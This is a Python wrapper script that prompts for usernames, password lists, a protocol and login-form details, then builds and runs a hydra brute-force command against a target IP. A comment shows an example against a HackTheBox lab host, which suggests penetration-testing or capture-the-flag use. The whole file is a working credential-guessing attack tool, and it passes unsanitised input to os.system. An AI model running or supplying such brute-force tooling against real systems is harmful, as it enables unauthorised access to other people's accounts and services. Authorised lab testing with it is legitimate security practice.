#!/usr/bin/python3
import os
import sys

ip = "1.1.1.1"
ip = sys.argv[1]

yes		= [ "yes","y", "yee yee", "yee", "yeah", "yeet", "yeet cannon", "yea", "yeah", "ye"]

while True:
	q1	= input("""
Would you like to use a...
1.	username?
2.	username list?
3.	default username list?
> """)
	try:
		q1 = int(q1)
		break
	except ValueError:
		print("Valid input would be nice.")
		continue
if q1 	== 1:
	ua 			= "l"
	username	= input("What is the username you want to brute force?\n> ")
elif q1 	== 2:
	ua 			= "L"
	username 	= input("What is the full path to the custom username list you would like to use?\n> ")
else:
	ua 			= "L"
	username 	= "/usr/share/seclists/Usernames/Names/names.txt"

while True:
	q2 	= input("""
Would you like to use a...
1. password?
2. password list?
3. default password list?
> """)
	try:
		q2 = int(q2)
		break
	except ValueError:
		print("Valid input would be nice.")
		continue
if q2 	== 1:
	pa 			= "p"
	password 	= input("What is the password you want to use?\n> ")
elif q2 	== 2:
	pa 			= "P"
	password 	= input("What is the full path to the custom password list you would like to use?\n> ")
else:
	pa 			= "P"
	password 	= "/usr/share/wordlists/rockyou.txt"

q3	= input("""
What is the protocol you would like to brute force?
Example Syntax: ssh
> """)
#	while True:
#		q4	= input("What is the port number you would like to brute force?\n> ")
#		try:
#			q4	= int(q4)
#			break
#		except ValueError:
#			print("Valid input would be nice.")
#			continue
#	command = "hydra -e nsr -{} {} -{} {} -t 6 {}://{} -s {}".format(ua, username, pa, password, q3, ip, q4)
q4	= input("Are you trying to run hydra on a http-post-form?\n> ")
if q4 in yes:
	dn 		= input("""
What is the ip or domain name of the page you are trying to hit?
Example Syntax internal-01.bart.htb (no http://)
> """)
	url		= input("""
What is the url after the domain name or IP of the page you are trying to hit?
Example Syntax /simple_chat/login.php (find in burp)
> """)
	chain	= input("""
What is the login chain? 
Example Syntax 	uname=^USER^&passwd=^PASS^&submit=Login  (be sure to change out ^USER^ and ^PASS^ so hydra knows what to fuzz)
> """)
	em	= input("""
What is a word or phrase in the error message?
Example Syntax 	Invalid Username or Password	(This is important becasue hydra will assume that the try is good if this phrase is not in the responce)
> """)
	command	= "hydra -{} {} -{} {} {} http-post-form '{}:{}:{}'".format(ua, username, pa, password, dn, url, chain, em)
	#hydra -l harvey -P /usr/share/wordlists/rockyou.txt internal-01.bart.htb http-post-form "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=Login:Password"
else:
	command = "hydra -e nsr -{} {} -{} {} -t 6 {}://{}".format(ua, username, pa, password, q3, ip)

input(command)
os.system(command)

